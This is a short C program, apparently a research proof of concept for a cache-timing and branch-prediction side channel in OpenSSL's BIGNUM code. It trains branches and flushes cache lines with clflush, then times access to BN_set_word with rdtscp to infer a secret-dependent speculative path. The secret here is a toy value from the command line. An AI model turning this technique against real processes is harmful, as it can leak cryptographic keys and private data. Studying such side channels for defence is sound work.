#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#include <openssl/bn.h>

#define clflush(a) asm volatile ("clflush 0(%0)": : "r" (&a):);
#define access(a) asm volatile ("mov (%0), %%eax" :: "r"((void*)a));
#define memory_barrier asm volatile ("mfence;\nsfence;\nlfence;\n");
BIGNUM* a __attribute__((aligned(4096)));
BIGNUM* b __attribute__((aligned(4096)));
BN_ULONG secret __attribute__((aligned(4096))) = 0;
BIGNUM* ptr __attribute__((aligned(4096)));

int main(int argc, char *argv[])
{
  if ((atoi(argv[1])%2) == 0)
    secret = 0;
  else
    secret = 1;
  ptr = b;
  memory_barrier

  unsigned int dummy;
  a = BN_new();
  b = BN_new();

  BN_set_word(a, 1);
  BN_set_word(b, 0);
  memory_barrier

  // Train branch1 true, branch2 false 
  BN_mul_word(a, 1);
  BN_set_word(a, 1);
  BN_mul_word(a, 1);

  memory_barrier
  clflush(BN_set_word);
  clflush(b);
  clflush(ptr);
  *(volatile BN_ULONG*)&secret;
  memory_barrier
  
  //Branch1 should be false
  BN_mul_word(b, secret);
  memory_barrier

  uint64_t time = __rdtscp(&dummy);
  *(volatile uint64_t*)&BN_set_word;
  time = __rdtscp(&dummy) - time;
  memory_barrier
  printf("Time: %ld\n", time) ;

  BN_free(a);
}
